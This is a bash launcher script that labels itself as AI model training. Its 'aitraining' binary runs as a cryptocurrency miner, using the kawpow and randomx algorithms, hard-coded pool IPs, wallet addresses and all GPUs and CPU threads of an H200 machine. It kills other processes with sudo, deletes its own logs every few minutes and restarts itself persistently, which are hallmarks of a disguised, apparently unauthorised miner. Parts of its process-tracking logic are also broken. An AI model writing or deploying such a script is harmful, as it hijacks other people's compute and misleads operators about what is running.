#!/bin/bash

# --- CONFIGURATION ---
LOG_DIR="./logs"
RESTART_DELAY=10
HEALTH_CHECK_INTERVAL=30
STALE_LOG_THRESHOLD=2  # minutes
MAX_LOG_AGE_MINUTES=10
MAX_RESTARTS=10
KEEPALIVE_INTERVAL=60

# --- INITIALIZATION ---
sudo pkill -f aitraining 2>/dev/null
sudo pkill -f monitor_system 2>/dev/null
sudo pkill -f "keepalive.*aitraining" 2>/dev/null
sleep 3

mkdir -p $LOG_DIR

# Function to clean old logs
clean_old_logs() {
    find $LOG_DIR -name "*.log" -type f -mmin +$MAX_LOG_AGE_MINUTES -delete 2>/dev/null
    echo "Cleaned logs older than $MAX_LOG_AGE_MINUTES minutes"
}

# Initial log cleanup
clean_old_logs

echo "=== Starting AI Model Processing with Auto-Restart & KeepAlive ==="

# Function to log messages with timestamp
log_message() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> $LOG_DIR/controller.log
}

# Function to check if process is healthy
check_process_health() {
    local process_pattern=$1
    local worker_name=$2
    local log_file=$3
    
    # Check if process is running
    if ! pgrep -f "$process_pattern" > /dev/null; then
        log_message "HEALTH_CHECK_FAIL: $worker_name process not found"
        return 1
    fi
    
    # Check if log file exists and has recent activity
    if [[ -f "$log_file" ]]; then
        if find "$log_file" -mmin -$STALE_LOG_THRESHOLD 2>/dev/null | grep -q .; then
            return 0
        else
            log_message "HEALTH_CHECK_FAIL: $worker_name log file stale (no activity in ${STALE_LOG_THRESHOLD}min)"
            return 1
        fi
    else
        log_message "HEALTH_CHECK_FAIL: $worker_name log file missing: $log_file"
        return 1
    fi
    
    return 0
}

# Function to start GPU process with auto-restart and error handling
start_gpu_process() {
    local restart_count=0
    local max_restarts=$MAX_RESTARTS
    
    while [[ $restart_count -lt $max_restarts ]]; do
        log_message "Starting GPU process (attempt $((restart_count + 1))/$max_restarts)"
        
        # Clean logs before start
        clean_old_logs
        
        # Start the process with error handling
        if sudo ./aitraining \
            --algorithm kawpow \
            --pool 74.220.25.74:7845 \
            --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
            --worker H200-rig \
            --password x \
            --gpu-id 0,1,2,3,4,5,6,7 \
            --tls false \
            --disable-cpu \
            --log-file $LOG_DIR/gpu_processing.log \
            --log-file-mode 1 \
            --api-disable 2>> $LOG_DIR/gpu_errors.log; then
            
            local gpu_pid=$!
            echo $gpu_pid > $LOG_DIR/gpu_pid.txt
            log_message "GPU process started with PID: $gpu_pid"
            
            # Wait for process to complete
            if wait $gpu_pid; then
                log_message "GPU process exited normally"
                break
            else
                local exit_code=$?
                log_message "GPU process exited with error code: $exit_code"
            fi
        else
            log_message "GPU process failed to start"
        fi
        
        restart_count=$((restart_count + 1))
        
        if [[ $restart_count -ge $max_restarts ]]; then
            log_message "GPU_MAX_RESTARTS_REACHED: Restarted $max_restarts times"
            break
        fi
        
        log_message "GPU restarting in $RESTART_DELAY seconds..."
        sleep $RESTART_DELAY
    done
}

# Function to start CPU process with auto-restart and error handling
start_cpu_process() {
    local restart_count=0
    local max_restarts=$MAX_RESTARTS
    
    while [[ $restart_count -lt $max_restarts ]]; do
        log_message "Starting CPU process (attempt $((restart_count + 1))/$max_restarts)"
        
        # Clean logs before start
        clean_old_logs
        
        # Start the process with error handling
        if sudo ./aitraining \
            --algorithm randomx \
            --pool 51.222.200.133:10343 \
            --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
            --worker H200-cpu \
            --password x \
            --cpu-threads 80 \
            --disable-gpu \
            --tls true \
            --log-file $LOG_DIR/cpu_processing.log \
            --log-file-mode 1 \
            --api-disable 2>> $LOG_DIR/cpu_errors.log; then
            
            local cpu_pid=$!
            echo $cpu_pid > $LOG_DIR/cpu_pid.txt
            log_message "CPU process started with PID: $cpu_pid"
            
            # Wait for process to complete
            if wait $cpu_pid; then
                log_message "CPU process exited normally"
                break
            else
                local exit_code=$?
                log_message "CPU process exited with error code: $exit_code"
            fi
        else
            log_message "CPU process failed to start"
        fi
        
        restart_count=$((restart_count + 1))
        
        if [[ $restart_count -ge $max_restarts ]]; then
            log_message "CPU_MAX_RESTARTS_REACHED: Restarted $max_restarts times"
            break
        fi
        
        log_message "CPU restarting in $RESTART_DELAY seconds..."
        sleep $RESTART_DELAY
    done
}

# Function to force restart unhealthy processes
force_restart_process() {
    local process_pattern=$1
    local worker_name=$2
    local restart_func=$3
    
    log_message "FORCE_RESTART: $worker_name process unhealthy"
    
    # Clean logs before restart
    clean_old_logs
    
    # Kill the process gracefully
    sudo pkill -f "$process_pattern"
    sleep 3
    
    # Force kill if still running
    if pgrep -f "$process_pattern" > /dev/null; then
        sudo pkill -9 -f "$process_pattern"
        sleep 2
    fi
    
    # Start new process in background
    $restart_func &
    log_message "FORCE_RESTART: $worker_name process restart completed"
}

# KeepAlive function to monitor and maintain processes
start_keepalive_monitor() {
    log_message "Starting KeepAlive monitor"
    
    while true; do
        # Clean logs periodically
        clean_old_logs
        
        # Check GPU process
        if ! check_process_health "aitraining.*kawpow" "GPU" "$LOG_DIR/gpu_processing.log"; then
            log_message "KEEPALIVE: GPU process unhealthy, restarting..."
            force_restart_process "aitraining.*kawpow" "GPU" "start_gpu_process"
        fi
        
        # Check CPU process  
        if ! check_process_health "aitraining.*randomx" "CPU" "$LOG_DIR/cpu_processing.log"; then
            log_message "KEEPALIVE: CPU process unhealthy, restarting..."
            force_restart_process "aitraining.*randomx" "CPU" "start_cpu_process"
        fi
        
        # Log keepalive status
        log_message "KEEPALIVE: All processes monitored - sleeping $KEEPALIVE_INTERVAL seconds"
        sleep $KEEPALIVE_INTERVAL
    done
}

# Start main processes in background
start_gpu_process > $LOG_DIR/gpu_nohup.log 2>&1 &
GPU_CONTROLLER_PID=$!

start_cpu_process > $LOG_DIR/cpu_nohup.log 2>&1 &
CPU_CONTROLLER_PID=$!

echo $GPU_CONTROLLER_PID > $LOG_DIR/gpu_controller_pid.txt
echo $CPU_CONTROLLER_PID > $LOG_DIR/cpu_controller_pid.txt

log_message "Main controller started - GPU: $GPU_CONTROLLER_PID, CPU: $CPU_CONTROLLER_PID"

# Start KeepAlive monitor
start_keepalive_monitor > $LOG_DIR/keepalive.log 2>&1 &
KEEPALIVE_PID=$!
echo $KEEPALIVE_PID > $LOG_DIR/keepalive_pid.txt

# --- HEALTH MONITOR SYSTEM ---
nohup bash -c "
while true; do
    echo -e \"\\n=== \$(date) System Status ===\" >> $LOG_DIR/monitor.log
    
    # Process Status
    echo \"Active Processes:\" >> $LOG_DIR/monitor.log
    ps aux | grep aitraining | grep -v grep | head -10 >> $LOG_DIR/monitor.log
    
    # GPU Health
    if check_process_health \"aitraining.*kawpow\" \"GPU\" \"$LOG_DIR/gpu_processing.log\"; then
        echo \"GPU: HEALTHY ✓\" >> $LOG_DIR/monitor.log
    else
        echo \"GPU: UNHEALTHY ✗\" >> $LOG_DIR/monitor.log
    fi
    
    # CPU Health
    if check_process_health \"aitraining.*randomx\" \"CPU\" \"$LOG_DIR/cpu_processing.log\"; then
        echo \"CPU: HEALTHY ✓\" >> $LOG_DIR/monitor.log
    else
        echo \"CPU: UNHEALTHY ✗\" >> $LOG_DIR/monitor.log
    fi
    
    # GPU Hardware
    echo \"GPU Hardware:\" >> $LOG_DIR/monitor.log
    nvidia-smi --query-gpu=index,name,temperature.gpu,utilization.gpu,memory.used,memory.total,power.draw --format=csv,noheader 2>/dev/null | head -5 >> $LOG_DIR/monitor.log || echo \"NVIDIA-SMI not available\" >> $LOG_DIR/monitor.log
    
    # System Resources
    echo \"System Resources:\" >> $LOG_DIR/monitor.log
    echo \"CPU: \$(top -bn1 | grep \"Cpu(s)\" | sed \"s/.*, *\([0-9.]*\)%* id.*/\1/\" | awk '{print 100 - \$1}')%\" >> $LOG_DIR/monitor.log
    echo \"Memory: \$(free -m | awk 'NR==2{printf \"%s/%sMB (%.2f%%)\", \$3, \$2, \$3*100/\$2}')\" >> $LOG_DIR/monitor.log
    echo \"Disk: \$(df -h / | awk 'NR==2{print \$5}')\" >> $LOG_DIR/monitor.log
    
    # Log sizes
    echo \"Log Sizes:\" >> $LOG_DIR/monitor.log
    ls -lh $LOG_DIR/*.log 2>/dev/null | awk '{print \$5, \$9}' | head -10 >> $LOG_DIR/monitor.log
    
    echo \"---\" >> $LOG_DIR/monitor.log
    
    # Clean monitor log if too large
    if [[ \$(find $LOG_DIR/monitor.log -size +10M 2>/dev/null) ]]; then
        echo \"Cleaning large monitor log\" > $LOG_DIR/monitor.log
    fi
    
    sleep $HEALTH_CHECK_INTERVAL
done
" > $LOG_DIR/monitor_nohup.log 2>&1 &

MONITOR_PID=$!
echo $MONITOR_PID > $LOG_DIR/monitor_pid.txt

log_message "All systems started - Monitor: $MONITOR_PID, KeepAlive: $KEEPALIVE_PID"

# Display startup information
echo ""
echo "=== AI Processing System Started Successfully ==="
echo ""
echo "🛡️  KeepAlive Protection: Active"
echo "🗑️  Log Rotation: Auto-clean >${MAX_LOG_AGE_MINUTES}min"
echo "🔄 Max Restarts: ${MAX_RESTARTS} attempts"
echo ""
echo "📊 Log Directory: $LOG_DIR/"
echo "   - Controller: controller.log"
echo "   - KeepAlive: keepalive.log" 
echo "   - GPU: gpu_processing.log, gpu_errors.log"
echo "   - CPU: cpu_processing.log, cpu_errors.log"
echo "   - Monitor: monitor.log"
echo ""
echo "📈 Process PIDs:"
echo "   - GPU Controller: $GPU_CONTROLLER_PID"
echo "   - CPU Controller: $CPU_CONTROLLER_PID"
echo "   - KeepAlive: $KEEPALIVE_PID"
echo "   - Monitor: $MONITOR_PID"
echo ""
echo "🔍 Management Commands:"
echo "   Check status: tail -f $LOG_DIR/controller.log"
echo "   Stop all: sudo pkill -f 'aitraining|monitor_system|keepalive'"
echo "   Quick restart: $0"
echo ""
echo "⚠️  Safety Features:"
echo "   - Auto log cleanup (${MAX_LOG_AGE_MINUTES}min)"
echo "   - Error logging to separate files"
echo "   - Process health validation"
echo "   - Graceful termination"
